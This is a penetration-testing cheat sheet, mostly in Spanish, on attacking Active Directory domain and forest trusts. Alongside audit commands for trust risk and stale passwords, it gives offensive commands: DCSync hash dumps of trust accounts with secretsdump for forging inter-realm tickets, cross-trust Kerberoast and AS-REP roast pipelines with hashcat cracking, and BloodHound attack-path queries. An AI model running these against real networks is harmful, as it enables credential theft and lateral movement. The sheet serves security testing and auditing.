---
aliases:
  - Trust Attack Recon
  - Cross-Forest Recon
  - Foreign Group Audit
  - Trust Account Discovery
tags:
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - Domain & Forest Trusts]]"
  - "[[Trust Abuse]]"
---
# AD - Domain & Forest Trusts - Trust Recon para Ataques

---

## Identificar Trust Surfaces Atacables

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADTrust -Filter * -Properties trustAttributes` | Trusts + bitfield para risk decode | Audit base. |
| `Get-ADTrust -Filter * \| ? Direction -eq "BiDirectional"` | Trusts bidireccionales (max blast radius) | High-priority. |
| `Get-ADTrust -Filter * -Pr trustAttributes \| ? {-not ($_.trustAttributes -band 0x4) -and -not ($_.trustAttributes -band 0x40) -and -not ($_.trustAttributes -band 0x20)}` | Cross-forest sin SID Filter | Critical attack surface. |
| `Get-ADTrust -Filter * -Pr trustAttributes \| ? {$_.trustAttributes -band 0x800}` | Trusts con TGT Delegation re-enabled | Critical (UD cross-forest). |
| `Get-ADTrust -Filter * \| ? {-not $_.SelectiveAuthentication}` | Trusts sin Selective Auth | Wide auth surface. |
^ad-trustrecon-surfaces

```powershell
# Risk-scored audit completo
Get-ADTrust -Filter * -Properties * | % {
  $score = 0
  if ($_.Direction -eq "BiDirectional")              { $score += 2 }
  if ($_.IsTransitive)                                { $score += 2 }
  if (-not $_.SelectiveAuthentication)                { $score += 2 }
  if (-not (($_.trustAttributes -band 0x4) -ne 0))    { $score += 3 }   # No SID Filter
  if (($_.trustAttributes -band 0x800) -ne 0)         { $score += 3 }   # TGT Delegation re-enabled

  [PSCustomObject]@{
    TrustName     = $_.Name
    Direction     = $_.Direction
    Transitive    = $_.IsTransitive
    SelectiveAuth = $_.SelectiveAuthentication
    SIDFilter     = (($_.trustAttributes -band 0x4) -ne 0) -or (($_.trustAttributes -band 0x40) -ne 0)
    TGTDeleg      = ($_.trustAttributes -band 0x800) -ne 0
    Risk = if ($score -ge 7) {"CRITICAL"} elseif ($score -ge 4) {"HIGH"} elseif ($score -ge 2) {"MEDIUM"} else {"LOW"}
  }
} | Sort Risk -Descending
```

---

## Foreign Group Membership Audit

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=local" -Filter *` | FSPs (SIDs foreign) | Identify cross-trust principals. |
| `Find-ForeignUser` (PowerView) | Users foreign en groups locales | Adversary tool. |
| `Find-ForeignGroup` (PowerView) | Groups foreign en groups locales | Cross-trust nested audit. |
| `Get-ADGroupMember "Domain Admins" -Recursive \| ? distinguishedName -match "ForeignSecurityPrincipals"` | Foreign principals en DA | Critical finding. |
| `Get-ADGroupMember "Enterprise Admins" -Recursive \| ? distinguishedName -match "ForeignSecurityPrincipals"` | Foreign en EA | Forest-wide critical. |
^ad-trustrecon-foreign

```powershell
# FSP resolution — SID → name
Get-ADObject -SearchBase "CN=ForeignSecurityPrincipals,DC=corp,DC=local" -Filter * | % {
  $sid = $_.Name
  try {
    $resolved = (New-Object System.Security.Principal.SecurityIdentifier($sid)).Translate([System.Security.Principal.NTAccount])
    [PSCustomObject]@{ SID = $sid; Name = $resolved }
  } catch {
    [PSCustomObject]@{ SID = $sid; Name = "UNRESOLVABLE" }
  }
}

# Foreign principals en priv groups
foreach ($g in "Domain Admins","Enterprise Admins","Schema Admins","Administrators") {
  Get-ADGroupMember $g -Recursive |
    Where { $_.distinguishedName -match "ForeignSecurityPrincipals" } |
    Select @{n='Group';e={$g}},Name,SID
}
```

---

## Cross-Trust Reachability Mapping (BloodHound)

| **Cypher Query** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (a:Domain)-[r:Trusts]->(b:Domain) RETURN a.name AS From, b.name AS To, r.direction AS Direction, r.istransitive AS Transitive` | Map trusts visualmente | Forest topology. |
| `MATCH (u {owned:true}) MATCH (g:Group) WHERE g.name CONTAINS "DOMAIN ADMINS" MATCH p=shortestPath((u)-[*1..]->(g)) RETURN p` | Path desde owned a DA cualquier domain | Attack path planning. |
| `MATCH (u:User {owned:true}) MATCH (target {highvalue:true}) WHERE u.domain <> target.domain MATCH p=shortestPath((u)-[*1..15]->(target)) RETURN p` | Cross-trust paths a high-value | Cross-forest attack. |
| `bloodhound-python -d corp.local -u u -p p -ns <DC> -c Trusts --zip` | Collection focada en trusts | Linux. |
| `SharpHound.exe -c Trusts,ACL,ObjectProps,Container` | Collection completa cross-trust | Windows. |
^ad-trustrecon-mapping

```bash
# Multi-domain ingest pipeline
for dom in corp.local partner.com vendor.local; do
  echo "=== Collecting $dom ==="
  bloodhound-python -d "$dom" -u "auditor@$dom" -p 'Pass!' \
    -ns $(dig +short SRV "_ldap._tcp.dc._msdcs.$dom" | awk '{print $4}' | head -1 | sed 's/\.$//') \
    -c All --zip -o "./loot/$dom/"
done

# Drag-drop ZIPs en BHCE → cross-domain auto-correlate
```

---

## Trust Account Discovery (DCSync Targets)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {UserAccountControl -band 2048} -Properties UserAccountControl,SamAccountName,Description` | Trust accounts (`<NETBIOS>$`) | Identify TDOs. |
| `secretsdump.py corp/admin:pass@<DC> -just-dc` | NTDS dump completo (incluye trust accounts) | Privileged DCSync. |
| `secretsdump.py corp/admin:pass@<DC> -just-dc-user 'PARTNER$'` | Solo trust account específico | Targeted. |
| `secretsdump.py corp/admin:pass@<DC> -just-dc \| grep '\$:'` | Filter trust accounts del dump | Post-process. |
^ad-trustrecon-tdo

**Output esperado del DCSync:**
```
PARTNER$:1234:aad3b435b51404eeaad3b435b51404ee:<NTLM-hash>:::
```
Format: `<TrustAccountName>:RID:LM_HASH:NT_HASH:::`. Hash NT del trust = clave para forjar inter-realm TGTs.

```powershell
# RSAT detection sin DCSync
Get-ADUser -Filter {UserAccountControl -band 2048} `
  -Properties UserAccountControl,SamAccountName,Description,whenCreated |
  Select SamAccountName,Description,whenCreated
```

---

## Cross-Trust Kerberoast / AS-REP Roast

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `GetUserSPNs.py -target-domain partner.com corp.local/user:pass -dc-ip <DC-A> -request` | TGS hashes de service accounts foreign | Cross-trust kerberoast. |
| `GetUserSPNs.py -target-domain partner.com corp.local/user:pass -dc-ip <DC-A> -request -outputfile foreign.kerb` | Save hashes a file | Crack offline. |
| `GetNPUsers.py -target-domain partner.com corp.local/user:pass -dc-ip <DC-A> -no-pass -usersfile foreign_users.txt` | AS-REP roast cross-trust | Pre-auth disabled foreign. |
| `setspn -T partner.com -Q */*` | SPNs cross-trust desde Windows | Native discovery. |
| `nxc ldap <foreign-DC> -u 'corp\u' -p pass --kerberoasting cross.txt` | Cross-trust kerberoast netexec | Quick. |
| Hashcat `-m 13100` (TGS) / `-m 18200` (AS-REP) | Crack mode | Standard. |
^ad-trustrecon-roast

**Requisito:** trust con direction `Outbound` (we trust them) o `BiDirectional`. Local user puede solicitar tickets para SPNs en foreign domain.

```bash
# Pipeline cross-trust kerberoast
TARGET="partner.com"
SOURCE_DC=$(dig +short SRV "_ldap._tcp.dc._msdcs.corp.local" | awk '{print $4}' | head -1 | sed 's/\.$//')

GetUserSPNs.py -target-domain "$TARGET" \
  corp.local/auditor:'Pass!' \
  -dc-ip "$SOURCE_DC" \
  -request \
  -outputfile cross_kerb.hash

hashcat -m 13100 cross_kerb.hash /usr/share/wordlists/rockyou.txt
```

---

## Trust Password Brute / Stale Detection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADTrust -Filter * -Pr lastTrustExchangeTime` | Última rotación trust password | Detectar trust stale. |
| `Get-ADUser -Filter {UserAccountControl -band 2048} -Pr PasswordLastSet` | Password age trust accounts | Audit stale. |
| `Get-ADUser <NETBIOS>$ -Pr msDS-KeyVersionNumber` | KVNO del trust account | Forensic. |
^ad-trustrecon-stale

**Default rotation:** 30 días automático. Trust accounts con `PasswordLastSet > 30d` = stale, indica problema operacional o trust roto.

```powershell
# Trust accounts con passwords viejos
Get-ADUser -Filter {UserAccountControl -band 2048} -Properties PasswordLastSet |
  Where { $_.PasswordLastSet -lt (Get-Date).AddDays(-60) } |
  Select SamAccountName,PasswordLastSet
```

---
